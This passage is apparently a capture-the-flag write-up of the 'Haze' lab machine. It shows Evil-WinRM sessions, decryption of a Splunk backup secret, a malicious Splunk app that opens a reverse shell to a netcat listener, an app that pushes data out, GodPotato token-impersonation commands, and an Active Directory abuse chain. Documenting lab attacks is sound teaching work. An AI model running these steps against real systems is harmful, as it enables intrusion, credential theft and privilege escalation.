```

We got the user flag.

```PowerShell
*Evil-WinRM* PS C:\Users\edward.martin\Documents> whoami /groups  
   
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                         Attributes  
=========================================== ================ =========================================== ==================================================  
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group  
HAZE\Backup_Reviewers                       Group            S-1-5-21-323145914-28650650-2368316563-1109 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
*Evil-WinRM* PS C:\Users\edward.martin\Documents> cd /  
*Evil-WinRM* PS C:\> dir  
  
  
   Directory: C:\  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----          3/5/2025  12:32 AM                Backups  
d-----         3/25/2025   2:06 PM                inetpub  
d-----          5/8/2021   1:20 AM                PerfLogs  
d-r---          3/4/2025  11:28 PM                Program Files  
d-----          5/8/2021   2:40 AM                Program Files (x86)  
d-r---          7/1/2026  11:52 AM                Users  
d-----         3/25/2025   2:15 PM                Windows  
  
  
*Evil-WinRM* PS C:\> cd Backups  
*Evil-WinRM* PS C:\Backups> dir  
  
  
   Directory: C:\Backups  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----          3/5/2025  12:33 AM                Splunk  
  
  
*Evil-WinRM* PS C:\Backups> cd Splunk  
*Evil-WinRM* PS C:\Backups\Splunk> dir  
  
  
   Directory: C:\Backups\Splunk  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip

*Evil-WinRM* PS C:\Backups\Splunk> download splunk_backup_2024-08-06.zip /tmp/haze/splunk_backup.zip
```

Then, on the host, we get inside the backup :

```bash
>  cat splunk.secret  
<REDACTED_BACKUP_SPLUNK_SECRET>


>  cat authentication.conf  
[default]  
  
minPasswordLength = 8  
minPasswordUppercase = 0  
minPasswordLowercase = 0  
minPasswordSpecial = 0  
minPasswordDigit = 0  
  
  
[Haze LDAP Auth]  
  
SSLEnabled = 0  
anonymous_referrals = 1  
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb  
bindDNpassword = <REDACTED_$1$_CIPHERTEXT>  
charset = utf8  
emailAttribute = mail  
enableRangeRetrieval = 0  
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb  
groupMappingAttribute = dn  
groupMemberAttribute = member  
groupNameAttribute = cn  
host = dc01.haze.htb  
nestedGroups = 0  
network_timeout = 20  
pagelimit = -1  
port = 389  
realNameAttribute = cn  
sizelimit = 1000  
timelimit = 15  
userBaseDN = CN=Users,DC=haze,DC=htb  
userNameAttribute = samaccountname  
  
[authentication]  
authSettings = Haze LDAP Auth  
authType = LDAP%
```

We got the `bindDNpassword` : `<REDACTED_$1$_CIPHERTEXT>` cipher.

```bash
>  splunksecrets splunk-decrypt --splunk-secret splunk.secret --ciphertext '<REDACTED_$1$_CIPHERTEXT>'  
<REDACTED_SPLUNK_ADMIN_PASSWORD>
```

`admin:<REDACTED_SPLUNK_ADMIN_PASSWORD>` is the Splunk **local** web login — not the AD account `alexander.green` (that password has rotated since the backup).

But `netexec` gives us a [-] on `smb` and `winrm`.

So we'll try it on Splunk and it works with the credentials `admin:<REDACTED_SPLUNK_ADMIN_PASSWORD>`.

We're now Administrator on `http://haze.htb:8000/`.

We open a listener with netcat and upload a malicious `.spl` on Splunk to get a reverse shell :

```bash
>  nc -lvnp 9002  
  
Listening on 0.0.0.0 9002  
Connection received on 10.129.232.50 50660  
whoami  
haze\alexander.green  
PS C:\Windows\system32>
```

```PowerShell
PS C:\Windows\system32> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                               State      
============================= ========================================= ========  
SeMachineAccountPrivilege     Add workstations to domain                Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have `SeImpersonatePrivilege`.

We open another listener and go back on edward's shell to upload `nc64` and `GodPotato` :

```bash
>  nc -lvnp 9003  
  
Listening on 0.0.0.0 9003
```

```PowerShell
*Evil-WinRM* PS C:\Users\edward.martin\Documents> upload /path/to/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe  
  
  
                                          
Warning: Press "y" to exit, press any other key to continue  
*Evil-WinRM* PS C:\Users\edward.martin\Documents> upload /tmp/haze/bin/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe  
   
                                          
Info: Uploading /tmp/haze/bin/nc64.exe to C:\Users\edward.martin\Documents\C:WindowsSystem32spooldriverscolornc64.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Data: 58260 bytes of 58260 bytes copied  
                                          
Info: Upload successful!  
*Evil-WinRM* PS C:\Users\edward.martin\Documents> upload /tmp/haze/bin/GodPotato-NET4.exe C:\Windows\System32\spool\drivers\color\GodPotato.exe  
  
                                        
Info: Uploading /tmp/haze/bin/GodPotato-NET4.exe to C:\Users\edward.martin\Documents\C:WindowsSystem32spooldriverscolorGodPotato.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                        
Data: 76456 bytes of 76456 bytes copied  
                                        
Info: Upload successful!
```

`evil-winrm upload` with a full `C:\...` destination path mangles the target — files landed under `Documents\` instead of `color\`. **`nxc winrm --put-file`** is more reliable:

```bash
nxc winrm dc01.haze.htb -u edward.martin -H <EDWARD_NTLM_HASH> -d haze.htb \
  --put-file /tmp/haze/bin/GodPotato-NET4.exe 'C:\Users\edward.martin\Documents\GodPotato-NET4.exe'
```

From the **alexander.green** reverse shell (`haze\alexander.green`), GodPotato must run as that user — Edward has no `SeImpersonatePrivilege`.

### Option A — inline root read (no second listener)

```powershell
C:\Users\edward.martin\Documents\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

### Option B — Splunk app one-shot exfil (what we used)

Bundle GodPotato in a `.spl` modular input; on run it writes the flag and TCP-pushes to your listener. Connection closes after one send — that is expected.

```bash
nc -lvnp 9003

Listening on 0.0.0.0 9003
Connection received on 10.129.232.50 65391
<REDACTED_ROOT_FLAG>
```

```bash
nxc winrm dc01.haze.htb -u edward.martin -H <EDWARD_NTLM_HASH> -d haze.htb \
  -X 'type C:\Users\edward.martin\Desktop\user.txt' --no-progress
# user: <REDACTED_USER_FLAG>
```

---

## Root flag location

| Artifact | Path |
|----------|------|
| **user.txt** | `C:\Users\edward.martin\Desktop\user.txt` |
| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` |

Edward can read his own Desktop; only **SYSTEM** / Administrator can read `Administrator\Desktop\root.txt` directly.

---

## Full chain (publish summary)

```text
CVE-2024-36991 (Splunk LFI) → splunk.secret + authentication.conf
  → splunksecrets → LDAP password → spray → mark.adams
  → gMSA WriteProperty → Haze-IT-Backup$ hash (LDAPS :636)
  → WriteOwner Support_Services → dacledit WriteMembers → bloodyad
  → certipy shadow → edward.martin
  → Backup_Reviewers → splunk_backup zip → $1$ decrypt
  → Splunk web admin → malicious .spl → alexander.green
  → SeImpersonatePrivilege → GodPotato → root.txt
```

---

## Scars (do not repeat)

| # | Trap | Fix |
|---|------|-----|
| 1 | `owneredit` then pause — owner reverts to Domain Admins | Run **write → read → dacledit → bloodyad → certipy** in one session |
| 2 | `SUPPORT_SERVICES` vs `Support_Services` | Use exact **`Support_Services`** for `owneredit` |
| 3 | SMB `C$` pull as Edward | **WinRM** or TCP exfil — `C$` needs admin share |
| 4 | evil-winrm `download` on 27 MB zip | **TCP `CopyTo` + `nc`** |
| 5 | Spray backup password at `alexander.green` AD | Decrypt unlocks **Splunk local `admin`** on `:8000`, not AD login |
| 6 | GodPotato as Edward | Only **Splunk service user** has `SeImpersonate` |
| 7 | Root `.spl` “rev shell” drops instantly | One-shot exfil by design — use **interactive** `.spl` on `:9002` if you need a shell |

---

## MITRE (high level)

| Phase | Techniques |
|-------|------------|
| Foothold | T1190 Exploit Public-Facing Application (Splunk LFI) |
| Cred access | T1552.001 Credentials in Files |
| AD privesc | T1222.001 DACL abuse · T1558.004 Shadow credentials · gMSA abuse |
| Privesc | T1055 Token impersonation (GodPotato / SeImpersonate) |

---

*Haze [HARD] — sealed. Secrets redacted for publication.*
